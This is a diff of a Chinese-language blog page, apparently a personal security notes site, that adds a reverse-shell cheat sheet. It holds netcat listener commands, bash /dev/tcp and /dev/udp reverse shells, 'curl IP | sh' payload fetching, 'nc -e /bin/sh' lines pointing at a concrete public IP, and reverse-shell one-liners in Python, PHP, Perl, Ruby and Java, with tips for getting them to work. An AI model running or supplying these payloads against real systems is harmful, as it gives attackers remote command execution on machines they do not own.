@@ -5,9 +5,11 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="反弹shell, Aurorabin">
-    <meta name="description" content="反弹shell使用bash bash -i &amp;gt;&amp;amp; &amp;#x2F;dev&amp;#x2F;tcp&amp;#x2F;ip&amp;#x2F;9999 &amp;lt;&amp;amp;1 
-但是很多时候都是不成功的
-使用shell执行脚本有两种方式，分别是bash x">
+    <meta name="description" content="反弹shell监听端口一般使用nc -lvvp 12345
+阿里云和腾讯云建议使用 nc -lvvnp 12345
+宝塔防火墙或者小皮防火墙要设置它们的防火墙
+Windows反弹shell使用telnet ip port
+使用bashbas">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -410,7 +412,14 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h2 id="使用bash"><a href="#使用bash" class="headerlink" title="使用bash"></a>使用bash</h2><p> bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;9999 &lt;&amp;1 </p>
+                <h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h2 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h2><p>一般使用<code>nc -lvvp 12345</code></p>
+<p>阿里云和腾讯云建议使用 <code>nc -lvvnp 12345</code></p>
+<p>宝塔防火墙或者小皮防火墙要设置它们的防火墙</p>
+<p>Windows反弹shell使用telnet ip port</p>
+<h2 id="使用bash"><a href="#使用bash" class="headerlink" title="使用bash"></a>使用bash</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/ip/9999 <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;1</span>
+
+<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/udp/ip/9999 <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;1</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>但是很多时候都是不成功的</p>
 <p>使用shell执行脚本有两种方式，分别是bash xxx.sh和bash -c “cmd string”。<br>根据报错信息可知，目标主机使用的是sh，是bash的精简版本，相当于bash –posix模式。<br>Posix标准shell不提供此功能，这个特性很奇怪，假装有一个&#x2F;dev&#x2F;tcp&#x2F;目录。<br>    解决办法：以后默认使用bash -c “cmd string”进行反弹shell。</p>
 <pre><code>成功反弹shell，值得注意的是，有时候会报错，建议尝试执行1-3遍：
@@ -430,11 +439,54 @@
 <span class="token comment"># 2. On the target machine:</span>
 <span class="token function">curl</span> https://your-shell.com/175.178.196.226:12345 <span class="token operator">|</span> <span class="token function">sh</span>
 <span class="token comment">#</span>
-<span class="token comment"># 3. Don't be a dick</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment"># 3. Don't be a dick</span>
 
-<h2 id="使用nc-php一般使用nc"><a href="#使用nc-php一般使用nc" class="headerlink" title="使用nc(php一般使用nc)"></a>使用nc(php一般使用nc)</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token number">175.178</span>.196.226 <span class="token number">12345</span> <span class="token parameter variable">-e</span> /bin/sh   <span class="token punctuation">(</span>一定要放后面这个<span class="token punctuation">)</span>
-<span class="token function">nc</span> <span class="token number">175.178</span>.196.226 <span class="token number">12345</span> <span class="token parameter variable">-e</span> /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<span class="token comment">#还有一种方法</span>
+<span class="token function">curl</span> <span class="token number">175.178</span>.196.226<span class="token operator">|</span><span class="token function">bash</span>
+<span class="token function">curl</span> <span class="token number">175.178</span>.196.226<span class="token operator">|</span><span class="token function">sh</span>
+<span class="token comment">#服务器的index.html上写</span>
+<span class="token comment">#nc 175.178.196.226 12345 -e /bin/bash</span>
+<span class="token comment">#nc 175.178.196.226 12345 -e /bin/sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h2 id="使用nc-php一般使用nc"><a href="#使用nc-php一般使用nc" class="headerlink" title="使用nc(php一般使用nc)"></a>使用nc(php一般使用nc)</h2><p><code>-e /bin/sh</code>的位置与os有关，有时在前有时在后</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token number">175.178</span>.196.226 <span class="token number">12345</span> <span class="token parameter variable">-e</span> /bin/sh  
+<span class="token function">nc</span> <span class="token number">175.178</span>.196.226 <span class="token number">12345</span> <span class="token parameter variable">-e</span> /bin/bash
+<span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/bash <span class="token number">175.178</span>.196.226 <span class="token number">12345</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>python</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.xxx.xxx.72",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>php</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">php <span class="token parameter variable">-r</span> <span class="token string">'$sock=fsockopen("47.xxx.xxx.72",2333);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p> perl </p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">perl <span class="token parameter variable">-e</span> <span class="token string">'use Socket;$i="192.168.99.242";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");&#125;;'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>ruby</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ruby <span class="token parameter variable">-rsocket</span> -e<span class="token string">'f=TCPSocket.open("192.168.99.242",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d",f,f,f)'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>java</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Revs</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">/**
+
+   * @param args
+     * @throws Exception 
+       */</span>
+       <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+       <span class="token comment">// TODO Auto-generated method stub</span>
+       <span class="token class-name">Runtime</span> r <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token class-name">String</span> cmd<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/192.168.99.242/1234;cat &lt;&amp;5 | while read line; do $line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+       <span class="token class-name">Process</span> p <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+       p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token punctuation">&#125;</span>
+       <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>编译执行</p>
+<p>javac Revs.java<br>java Revs</p>
 
                 
             </div>
